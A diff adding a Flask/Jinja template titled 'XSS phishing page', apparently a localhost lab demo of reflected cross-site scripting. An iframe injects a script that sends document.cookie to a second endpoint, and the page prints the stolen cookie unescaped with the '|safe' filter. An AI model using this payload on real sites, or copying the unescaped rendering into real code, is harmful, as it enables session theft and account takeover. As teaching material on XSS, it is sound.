@@ -1,0 +1,15 @@
+{% extends "layout.html" %}
+{% block content %}
+	<h1>XSS 钓鱼页面</h1>
+
+	{% if MESSAGE %}
+		<p>You are fooled</p>
+		cookie: {{MESSAGE|safe}}
+
+	{% else %}
+
+	<iframe width=620 height=300 src="http://127.0.0.1:5000/test1/?item=<script>window.location='http://127.0.0.1:5000/test2/?sid='%2Bdocument.cookie;</script>">
+		
+	</iframe>
+	{% endif %}
+{% endblock content %}
